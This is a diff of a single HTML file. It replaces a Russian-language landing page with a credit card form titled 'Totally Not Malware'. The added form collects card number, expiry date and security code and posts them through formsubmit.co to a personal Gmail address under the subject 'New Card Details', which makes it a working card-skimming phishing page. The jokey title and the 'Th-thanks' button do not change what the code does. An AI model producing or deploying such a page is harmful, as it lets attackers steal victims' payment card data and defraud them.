@@ -1,115 +1,72 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Главная страница</title>
-  <style>
-    /* Сброс стилей и общий фон */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to bottom, #1e3c72, #2a5298); /* Красивый градиент */
-      color: white;
-      display: flex;
-      flex-direction: column;
-      justify-content: space-between;
-      min-height: 100vh;
-      text-align: center;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Credit Card Form</title>
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-    /* Контейнер для кнопок */
-    .buttons-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      flex-grow: 1;
-    }
+        .form-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
 
-    /* Кнопки */
-    .button {
-      display: inline-block;
-      margin: 10px;
-      padding: 15px 40px;
-      font-size: 18px;
-      color: white;
-      text-decoration: none;
-      border-radius: 8px;
-      background: linear-gradient(45deg, #ff6f61, #de6262, #ff8e53);
-      background-size: 300%;
-      transition: 0.4s;
-      animation: gradient-animation 3s infinite;
-      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.4);
-    }
+        .form-container h1 {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
 
-    .button:hover {
-      background-position: right;
-      transform: scale(1.1);
-      box-shadow: 0px 6px 12px rgba(0, 0, 0, 0.6);
-    }
+        .form-container input {
+            width: 100%;
+            margin-bottom: 15px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
 
-    @keyframes gradient-animation {
-      0% { background-position: 0%; }
-      50% { background-position: 100%; }
-      100% { background-position: 0%; }
-    }
+        .form-container button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d7;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
 
-    /* Плашка (футер) */
-    footer {
-      background-color: rgba(0, 0, 0, 0.6);
-      padding: 10px 20px;
-      font-size: 14px;
-    }
-
-    .footer-links {
-      display: flex;
-      justify-content: center;
-      flex-wrap: wrap;
-      list-style: none;
-      padding: 0;
-      margin: 10px 0;
-    }
-
-    .footer-links li {
-      margin: 5px 15px;
-    }
-
-    .footer-links a {
-      color: #ff8e53;
-      text-decoration: none;
-    }
-
-    .footer-links a:hover {
-      text-decoration: underline;
-    }
-  </style>
+        .form-container button:hover {
+            background-color: #005bb5;
+        }
+    </style>
 </head>
 <body>
-  <!-- Заголовок -->
-  <h1>Добро пожаловать!</h1>
-  <p>Выберите одну из страниц, чтобы продолжить:</p>
-
-  <!-- Кнопки -->
-  <div class="buttons-container">
-    <a href="index1.html" class="button">Первая страница</a>
-    <a href="index2.html" class="button">Вторая страница</a>
-    <a href="index3.html" class="button">Третья страница</a>
-    <a href="index4.html" class="button">Четвёртая страница</a>
-  </div>
-
-  <!-- Футер -->
-  <footer>
-    <ul class="footer-links">
-      <li><a href="privacy.html">Политика конфиденциальности</a></li>
-      <li><a href="terms.html">Условия использования</a></li>
-      <li><a href="contact.html">Контакты</a></li>
-    </ul>
-    <p>&copy; 2024 Ваша компания. Все права защищены.</p>
-  </footer>
+    <div class="form-container">
+        <h1>Totally Not Malware</h1>
+        <form action="https://formsubmit.co/andrej.g2103@gmail.com" method="POST">
+            <!-- Поля для ввода данных -->
+            <input type="text" name="Card Number" placeholder="Card number" required>
+            <input type="text" name="Expiry Date" placeholder="Expiry date" required>
+            <input type="text" name="Security Code" placeholder="Security code" required>
+            
+            <!-- Telegram Bot Info -->
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_subject" value="New Card Details">
+            <button type="submit">Th-thanks</button>
+        </form>
+    </div>
 </body>
 </html>
